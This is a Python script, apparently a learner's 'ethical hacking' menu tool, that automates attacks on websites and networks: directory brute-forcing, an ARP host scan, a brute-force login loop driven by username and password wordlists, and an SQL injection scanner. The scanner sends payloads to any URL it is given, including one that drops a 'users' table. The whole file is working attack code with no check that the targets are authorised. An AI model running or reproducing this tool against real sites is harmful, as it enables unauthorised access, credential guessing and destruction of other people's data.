import requests
import os
import sys
import socket
from scapy.all import ARP,Ether,srp
import ipaddress
import time
from bs4 import BeautifulSoup

def brute_dicts():
    word_dict="cracked_dict.txt" # filename where choosen directory names are stored
    url=input("$-$ Enter the URL of the choosed WebSite:")

    with open(word_dict,'r') as file:
        directories=file.read().splitlines()
    for directory in directories:
        cracked_url=f"{url}/{directory}"
        response=requests.get(cracked_url)
        if response.status_code==200:
            print(f"$-$ Found the specified directory in list: {cracked_url}")
        elif response.status_code==403:
            print(f"$-$ Access forbidden<break the password first>: {cracked_url}")
        elif response.status_code==404:
            print(f"$-$ Target directory not found: {cracked_url}")
        else:
            print(f"Something went wrong...")

def network_scan():
    if os.geteuid()!=0:
        print(f"$-$ You need root permissions for this...(run with sudo)")
        sys.exit(1)
    network_band=input("$-$ Provide the network band required for scan (ex.127.0.0.1/30)")
    port_range={1,20,21,22,25,53,80,88,110,143,8080,3000,443}
    #most important ports like http,imap,pop3,ftp,kerberos,https,smtp
    arp=ARP(pdst=network_band)
    ethernet=Ether(dst="ff:ff:ff:ff:ff:ff")
    packet=ethernet/arp
    result=srp(packet,timeout=2,verbose=False)[0]

    for sent,received in result:
        print(f"$-$ Device IP address:{received.psrc} , MAC:{received.hwsrc}")

def bruteForce_login():
    url=input("$-$ Enter the URL of the choosed webpage login menu:")
    saved_user_file="usernames_file.txt"
    saved_password_file="passwords_file.txt"
    #saved txt files for most common usernames and passwords for the specified website
    aux=0

    with open(saved_user_file,"r") as u_file:
        usernames=u_file.read().strip().splitlines()
    with open(saved_password_file,"r") as p_file:
        passwords=p_file.read().strip().splitlines()

    for user in usernames:
        for passw in passwords:
            login_data={'username':user,'password':passw,'submit':'login'}
            response=requests.post(url,data=login_data)
            if 'Login failed' not in response.text:
                aux=1
                print(f"$-$ Login successful with the Username:{user} / Password:{passw}")
                return 
    if aux==0:
        print("$-$ Failed to find mapping for the choosen usernames and passwords")

def scrape_website():
    url=input("$-$ Enter the URL for scraping:")
    response=requests.get(url)
    soup=BeautifulSoup(response.text,'html.parser')

    for tag in soup.find_all('a',href=True):
        print(f"Title:{tag.get_text().strip()}, Link:{tag['href']}")

def sql_injector_scan():
    url=input("$-$ Enter the URL needed for scanning:")
    payloads=["'","1' OR '1'='1","1';DROP TABLE users; --"] 
    #most common sql injections
    for payload in payloads:
        test_url=f"{url}{payload}" 
        response=requests.get(test_url)
        if any(keyword in response.text for keyword in ['SQL syntax','mysql','error']):
            print(f"$-$ The URL is vulnerable to SQL injections at:{test_url}")


def main():
    print("-------------------- WARNING!!! --------------------")
    print("This is a dangerous script... thread carefully")
    print("ALL ACTIONS might have unintended consequences")
    print("----------------------------------------------------")
    input("Press any key to continue:")
    print("This is a small script made to help automate some ethical hacking task for learning works in Linux OS/w any distro by Stefan Pituru ©")
    while(True):
        print("\n Choose an option:")
        print("1. $-$ Directory Brute Force <brute force a list of directories from a known website and choosed words as a dictonary> ")
        print("2. $-$ Network scan <scan a network within a specified range with some important port numbers> ...requires root permissions")
        print("3. $-$ Brute Force Login <tries to login into a webpage with selected/most common usernames and passwords found")
        print("4. $-$ WebSite Scraper <>")
        print("5. $-$ SQL Injection Scanner <scannes the Url for known types of SQL injections and prints a message if an vulnerability was found")
        print("0. $-$ Abort")

        choice=input("Enter your required function (1-5):")
        match choice:
            case '1':
                brute_dicts()
            case '2':
                network_scan()
            case '3':
                bruteForce_login()
            case '4':
                scrape_website()
            case '5':
                sql_injector_scan()
            case _:
                print("Aborting actions...")
                break
if __name__=="__main__":
        main()
